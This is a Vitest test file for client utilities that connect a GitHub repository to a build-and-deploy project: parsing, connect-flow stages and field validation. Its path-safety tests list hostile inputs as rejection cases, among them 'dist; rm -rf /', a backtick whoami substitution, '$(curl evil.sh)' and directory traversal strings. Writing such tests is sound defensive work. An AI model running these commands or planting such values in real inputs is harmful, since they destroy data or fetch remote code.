import { describe, expect, it } from "vitest"
import {
  buildFieldsEqual,
  DEFAULT_BUILD_COMMAND,
  DEFAULT_INSTALL_COMMAND,
  DEFAULT_OUTPUT_DIR,
  buildFieldsAreValid,
  buildFieldsFromConfig,
  buildRepoConnectRequestBody,
  defaultBuildFields,
  deriveConnectFlowStage,
  derivePanelAccess,
  formatSnapshotAge,
  isGithubInstallationView,
  isGithubRepoView,
  isProjectRepoConfigView,
  isSafeRepoRelativePath,
  parseInstallationsResponse,
  parseReposResponse,
  repoRefFromConfig,
  repoRefFromPicked,
  validateBranch,
  validateBuildFields,
  validateCommand,
  validateOutputDir,
  type BuildFieldsDraft,
  type GithubRepoView,
  type ProjectRepoConfigView,
} from "./project-repo-utils"

const INSTALLATION = { id: 42, accountLogin: "acme", htmlUrl: null }
const REPO: GithubRepoView = {
  id: 1,
  owner: "acme",
  name: "widget",
  fullName: "acme/widget",
  private: false,
  defaultBranch: "main",
}
const CONFIG: ProjectRepoConfigView = {
  installationId: 42,
  owner: "acme",
  name: "widget",
  defaultBranch: "main",
  branch: "main",
  installCommand: "npm ci",
  buildCommand: "npm run build",
  outputDir: "dist",
  autoDeploy: true,
}

describe("isGithubInstallationView", () => {
  it("accepts a well-formed installation", () => {
    expect(isGithubInstallationView(INSTALLATION)).toBe(true)
  })
  it("rejects a missing accountLogin", () => {
    expect(isGithubInstallationView({ id: 1 })).toBe(false)
  })
  it("rejects a non-object", () => {
    expect(isGithubInstallationView(null)).toBe(false)
    expect(isGithubInstallationView("42")).toBe(false)
  })
})

describe("isGithubRepoView", () => {
  it("accepts a well-formed repo", () => {
    expect(isGithubRepoView(REPO)).toBe(true)
  })
  it("rejects a missing defaultBranch", () => {
    const { defaultBranch: _defaultBranch, ...rest } = REPO
    expect(isGithubRepoView(rest)).toBe(false)
  })
  it("rejects a non-boolean private", () => {
    expect(isGithubRepoView({ ...REPO, private: "false" })).toBe(false)
  })
})

describe("isProjectRepoConfigView", () => {
  it("accepts a well-formed config", () => {
    expect(isProjectRepoConfigView(CONFIG)).toBe(true)
  })
  it("rejects a missing field", () => {
    const { autoDeploy: _autoDeploy, ...rest } = CONFIG
    expect(isProjectRepoConfigView(rest)).toBe(false)
  })
})

describe("parseInstallationsResponse", () => {
  it("passes through a well-formed configured response", () => {
    expect(parseInstallationsResponse({ configured: true, installations: [INSTALLATION] })).toEqual({
      configured: true,
      appSlug: null,
      installations: [INSTALLATION],
      stale: false,
      syncedAt: null,
    })
  })
  it("reads appSlug when it is a string, null otherwise", () => {
    expect(
      parseInstallationsResponse({ configured: true, appSlug: "desde-viewer-acme", installations: [] }).appSlug,
    ).toBe("desde-viewer-acme")
    expect(parseInstallationsResponse({ configured: true, appSlug: 7, installations: [] }).appSlug).toBeNull()
    expect(parseInstallationsResponse({ configured: true, installations: [] }).appSlug).toBeNull()
  })
  it("passes through the unconfigured shape", () => {
    expect(parseInstallationsResponse({ configured: false, installations: [] })).toEqual({
      configured: false,
      appSlug: null,
      installations: [],
      stale: false,
      syncedAt: null,
    })
  })
  it("filters out malformed entries rather than throwing", () => {
    expect(parseInstallationsResponse({ configured: true, installations: [INSTALLATION, { bad: true }] })).toEqual({
      configured: true,
      appSlug: null,
      installations: [INSTALLATION],
      stale: false,
      syncedAt: null,
    })
  })
  it("degrades a malformed/unreachable response to configured:false, not configured:true", () => {
    const degraded = { configured: false, appSlug: null, installations: [], stale: false, syncedAt: null }
    expect(parseInstallationsResponse(null)).toEqual(degraded)
    expect(parseInstallationsResponse("garbage")).toEqual(degraded)
    expect(parseInstallationsResponse({})).toEqual(degraded)
  })
  /**
   * Phase 3c-1b. `installationsStale` distinguishes "we have no current
   * snapshot of your GitHub access" from "your access is genuinely empty" —
   * different advice, so it must survive parsing, and must default to
   * `false` rather than being invented from a missing field.
   */
  it("reads installationsStale, defaulting to false when absent or non-boolean", () => {
    expect(
      parseInstallationsResponse({ configured: true, installations: [], installationsStale: true }).stale,
    ).toBe(true)
    expect(parseInstallationsResponse({ configured: true, installations: [] }).stale).toBe(false)
    expect(
      parseInstallationsResponse({ configured: true, installations: [], installationsStale: "yes" }).stale,
    ).toBe(false)
  })
})

describe("formatSnapshotAge", () => {
  const now = Date.parse("2026-08-07T12:00:00Z")
  const ago = (ms: number) => new Date(now - ms).toISOString()

  it("renders coarse ages with correct pluralisation", () => {
    expect(formatSnapshotAge(ago(30_000), now)).toBe("just now")
    expect(formatSnapshotAge(ago(60_000), now)).toBe("1 minute ago")
    expect(formatSnapshotAge(ago(5 * 60_000), now)).toBe("5 minutes ago")
    expect(formatSnapshotAge(ago(60 * 60_000), now)).toBe("1 hour ago")
    expect(formatSnapshotAge(ago(3 * 60 * 60_000), now)).toBe("3 hours ago")
    expect(formatSnapshotAge(ago(24 * 60 * 60_000), now)).toBe("1 day ago")
    expect(formatSnapshotAge(ago(9 * 24 * 60 * 60_000), now)).toBe("9 days ago")
  })

  it("returns null when there is no usable timestamp, and never a negative duration", () => {
    expect(formatSnapshotAge(null, now)).toBeNull()
    expect(formatSnapshotAge("not-a-date", now)).toBeNull()
    // Clock skew reads as "just now" rather than "-3 minutes ago".
    expect(formatSnapshotAge(ago(-3 * 60_000), now)).toBe("just now")
  })
})

describe("parseReposResponse", () => {
  it("passes through a well-formed configured response", () => {
    expect(parseReposResponse({ configured: true, repos: [REPO] })).toEqual({ configured: true, repos: [REPO] })
  })
  it("degrades a malformed response to configured:false", () => {
    expect(parseReposResponse(undefined)).toEqual({ configured: false, repos: [] })
  })
})

// Role-based (viewer-membership Task 12): authority is the caller's INSTANCE
// role now, not a project membership row — mirrors the server's
// `hasProjectManageAuthority`.
describe("derivePanelAccess", () => {
  it("loading takes priority over everything else", () => {
    expect(derivePanelAccess({ currentUserLoading: true, signedIn: false, canManage: false })).toBe("loading")
    expect(derivePanelAccess({ currentUserLoading: true, signedIn: true, canManage: true })).toBe("loading")
  })
  it("signed-out when not loading and not signed in", () => {
    expect(derivePanelAccess({ currentUserLoading: false, signedIn: false, canManage: false })).toBe("signed-out")
  })
  it("read-only when signed in but the role can't manage (viewer)", () => {
    expect(derivePanelAccess({ currentUserLoading: false, signedIn: true, canManage: false })).toBe("read-only")
  })
  it("can-manage when signed in and the role can manage (editor or admin)", () => {
    expect(derivePanelAccess({ currentUserLoading: false, signedIn: true, canManage: true })).toBe("can-manage")
  })
})

describe("repoRefFromConfig / repoRefFromPicked", () => {
  it("extracts the connect-relevant subset from a stored config", () => {
    expect(repoRefFromConfig(CONFIG)).toEqual({
      installationId: 42,
      owner: "acme",
      name: "widget",
      defaultBranch: "main",
    })
  })
  it("combines a selected installation id with a picked repo", () => {
    expect(repoRefFromPicked(42, REPO)).toEqual({
      installationId: 42,
      owner: "acme",
      name: "widget",
      defaultBranch: "main",
    })
  })
})

describe("deriveConnectFlowStage", () => {
  const base = {
    configured: true,
    initialRepoRef: null,
    installations: null,
    selectedInstallationId: null,
    repos: null,
    selectedRepo: null,
  }

  it("not-configured wins over everything, even mid-flow selections", () => {
    expect(
      deriveConnectFlowStage({
        ...base,
        configured: false,
        installations: [INSTALLATION],
        selectedInstallationId: 42,
      }),
    ).toEqual({ kind: "not-configured" })
  })

  it("build-form short-circuits via initialRepoRef (the Edit-existing-connection path) without touching installations/repos", () => {
    const repo = repoRefFromConfig(CONFIG)
    expect(deriveConnectFlowStage({ ...base, initialRepoRef: repo })).toEqual({ kind: "build-form", repo })
  })

  it("loading-installations while installations is null", () => {
    expect(deriveConnectFlowStage(base)).toEqual({ kind: "loading-installations" })
  })

  it("no-installations is DISTINCT from no-repos — empty installations list", () => {
    expect(deriveConnectFlowStage({ ...base, installations: [] })).toEqual({ kind: "no-installations" })
  })

  /**
   * Phase 3c-1b. A stale snapshot ALWAYS arrives as an empty list, so if
   * emptiness were tested first this stage would be unreachable and the
   * user would be told to install an App they may already have installed.
   */
  it("installations-stale is DISTINCT from no-installations and wins over the empty list", () => {
    expect(deriveConnectFlowStage({ ...base, installations: [], installationsStale: true })).toEqual({
      kind: "installations-stale",
    })
    // Not stale + empty stays no-installations; stale is never inferred.
    expect(deriveConnectFlowStage({ ...base, installations: [], installationsStale: false })).toEqual({
      kind: "no-installations",
    })
    // not-configured still wins over stale.
    expect(
      deriveConnectFlowStage({ ...base, configured: false, installations: [], installationsStale: true }),
    ).toEqual({ kind: "not-configured" })
  })

  it("installation-picker once installations load and none is selected yet", () => {
    expect(deriveConnectFlowStage({ ...base, installations: [INSTALLATION] })).toEqual({
      kind: "installation-picker",
      installations: [INSTALLATION],
    })
  })

  it("loading-repos once an installation is picked but repos haven't loaded", () => {
    expect(
      deriveConnectFlowStage({ ...base, installations: [INSTALLATION], selectedInstallationId: 42 }),
    ).toEqual({ kind: "loading-repos" })
  })

  it("no-repos is DISTINCT from no-installations — installation picked, repos loaded empty", () => {
    expect(
      deriveConnectFlowStage({
        ...base,
        installations: [INSTALLATION],
        selectedInstallationId: 42,
        repos: [],
      }),
    ).toEqual({ kind: "no-repos", installationId: 42 })
  })

  it("repo-picker once repos load and none is selected yet", () => {
    expect(
      deriveConnectFlowStage({
        ...base,
        installations: [INSTALLATION],
        selectedInstallationId: 42,
        repos: [REPO],
      }),
    ).toEqual({ kind: "repo-picker", repos: [REPO] })
  })

  it("build-form once a repo is picked from the fresh-connect flow", () => {
    expect(
      deriveConnectFlowStage({
        ...base,
        installations: [INSTALLATION],
        selectedInstallationId: 42,
        repos: [REPO],
        selectedRepo: REPO,
      }),
    ).toEqual({ kind: "build-form", repo: { installationId: 42, owner: "acme", name: "widget", defaultBranch: "main" } })
  })
})

describe("defaultBuildFields", () => {
  it("branch follows the repo's default branch; commands/outputDir use fixed defaults; autoDeploy on (Mo, 2026-08-29)", () => {
    expect(defaultBuildFields({ defaultBranch: "develop" })).toEqual({
      branch: "develop",
      installCommand: DEFAULT_INSTALL_COMMAND,
      buildCommand: DEFAULT_BUILD_COMMAND,
      outputDir: DEFAULT_OUTPUT_DIR,
      autoDeploy: true,
    })
  })
})

describe("buildFieldsFromConfig", () => {
  it("pre-fills from the STORED config, not the repo's defaults", () => {
    expect(buildFieldsFromConfig(CONFIG)).toEqual({
      branch: "main",
      installCommand: "npm ci",
      buildCommand: "npm run build",
      outputDir: "dist",
      autoDeploy: true,
    })
  })
})

describe("validateBranch", () => {
  it("rejects empty/whitespace-only", () => {
    expect(validateBranch("")).not.toBeNull()
    expect(validateBranch("   ")).not.toBeNull()
  })
  it("rejects over 255 characters", () => {
    expect(validateBranch("a".repeat(256))).not.toBeNull()
  })
  it("accepts a normal branch name", () => {
    expect(validateBranch("main")).toBeNull()
    expect(validateBranch("a".repeat(255))).toBeNull()
  })
})

describe("validateCommand", () => {
  it("rejects empty", () => {
    expect(validateCommand("", "Install command")).not.toBeNull()
  })
  it("rejects over 2000 characters", () => {
    expect(validateCommand("a".repeat(2001), "Build command")).not.toBeNull()
  })
  it("accepts a normal command", () => {
    expect(validateCommand("npm ci", "Install command")).toBeNull()
  })
})

describe("isSafeRepoRelativePath — repo-relative path, no traversal (mirrors the server's rule 1:1)", () => {
  it.each([
    ["empty string", ""],
    ["POSIX absolute", "/etc"],
    ["Windows/UNC absolute", "\\foo"],
    ["Windows drive-absolute", "C:\\Windows"],
    ["bare traversal", "../.."],
    ["embedded traversal", "foo/../../bar"],
    ["NUL byte", "foo\0bar"],
    ["over 1024 chars", "a".repeat(1025)],
    // Server rule (`project-repo-routes.ts`'s `isSafeRepoRelativePath`)
    // rejects these via a charset allowlist (`/^[A-Za-z0-9._\/-]+$/`)
    // checked BEFORE the traversal rules — none of these contain `..` or a
    // leading slash, so they satisfy every OTHER rule and would previously
    // slip past a client-side mirror missing that allowlist, only to be
    // caught (correctly) by the server. Kept here so client/server drift on
    // this specific rule can never again go unnoticed by this suite.
    ["shell command separator", "dist; rm -rf /"],
    ["backtick command substitution", "dist`whoami`"],
    ["$() command substitution", "$(curl evil.sh)"],
    // Server rule: a bare "." (or "./") resolves to the checkout root
    // itself, which would serve the ENTIRE repo — `.git`, a committed
    // `.env`, everything. Not a traversal-out-of-root case, so it needs its
    // own dedicated check distinct from the `..`-segment rule above.
    ["bare dot (resolves to the checkout root)", "."],
    ["dot-slash (resolves to the checkout root)", "./"],
  ])("rejects: %s", (_label, value) => {
    expect(isSafeRepoRelativePath(value)).toBe(false)
  })

  it.each([
    ["simple relative dir", "dist"],
    ["nested relative dir", "build/dist"],
    ["a directory literally named with dots (not a traversal segment)", "my..dir"],
  ])("accepts: %s", (_label, value) => {
    expect(isSafeRepoRelativePath(value)).toBe(true)
  })
})

describe("validateOutputDir", () => {
  it("rejects an unsafe path with a user-facing message", () => {
    expect(validateOutputDir("../../etc")).toEqual(expect.any(String))
  })
  it("accepts a safe path", () => {
    expect(validateOutputDir("dist")).toBeNull()
  })
})

describe("validateBuildFields / buildFieldsAreValid", () => {
  const valid: BuildFieldsDraft = {
    branch: "main",
    installCommand: "npm ci",
    buildCommand: "npm run build",
    outputDir: "dist",
    autoDeploy: false,
  }

  it("all-null errors and valid:true for a well-formed draft", () => {
    const errors = validateBuildFields(valid)
    expect(errors).toEqual({ branch: null, installCommand: null, buildCommand: null, outputDir: null })
    expect(buildFieldsAreValid(errors)).toBe(true)
  })

  it("a single bad field fails validity without masking the others' null-ness", () => {
    const errors = validateBuildFields({ ...valid, outputDir: "/etc" })
    expect(errors.branch).toBeNull()
    expect(errors.installCommand).toBeNull()
    expect(errors.buildCommand).toBeNull()
    expect(errors.outputDir).not.toBeNull()
    expect(buildFieldsAreValid(errors)).toBe(false)
  })
})

describe("buildRepoConnectRequestBody", () => {
  it("trims branch/commands, sends outputDir/autoDeploy verbatim, and carries the repo ref fields", () => {
    const repo = repoRefFromConfig(CONFIG)
    const fields: BuildFieldsDraft = {
      branch: "  main  ",
      installCommand: "  npm ci  ",
      buildCommand: "  npm run build  ",
      outputDir: "dist",
      autoDeploy: true,
    }
    expect(buildRepoConnectRequestBody(repo, fields)).toEqual({
      installationId: 42,
      owner: "acme",
      name: "widget",
      branch: "main",
      installCommand: "npm ci",
      buildCommand: "npm run build",
      outputDir: "dist",
      autoDeploy: true,
    })
  })
})

describe("buildFieldsEqual", () => {
  const SAVED = {
    branch: "main",
    installCommand: "npm ci",
    buildCommand: "npm run build",
    outputDir: "dist",
    autoDeploy: true,
  }

  it("is true for an untouched draft, which is what keeps Save disabled", () => {
    expect(buildFieldsEqual({ ...SAVED }, SAVED)).toBe(true)
  })

  it("notices a change in EVERY field", () => {
    // One case per field on purpose. A comparison that forgets a field leaves
    // Save dead after editing exactly that field, and a single "something
    // changed" case would not catch it.
    expect(buildFieldsEqual({ ...SAVED, branch: "release/2026-08" }, SAVED)).toBe(false)
    expect(buildFieldsEqual({ ...SAVED, installCommand: "npm i" }, SAVED)).toBe(false)
    expect(buildFieldsEqual({ ...SAVED, buildCommand: "npm run bundle" }, SAVED)).toBe(false)
    expect(buildFieldsEqual({ ...SAVED, outputDir: "build" }, SAVED)).toBe(false)
    expect(buildFieldsEqual({ ...SAVED, autoDeploy: false }, SAVED)).toBe(false)
  })

  it("treats whitespace as a change, because the server will store it", () => {
    expect(buildFieldsEqual({ ...SAVED, outputDir: "dist " }, SAVED)).toBe(false)
  })
})
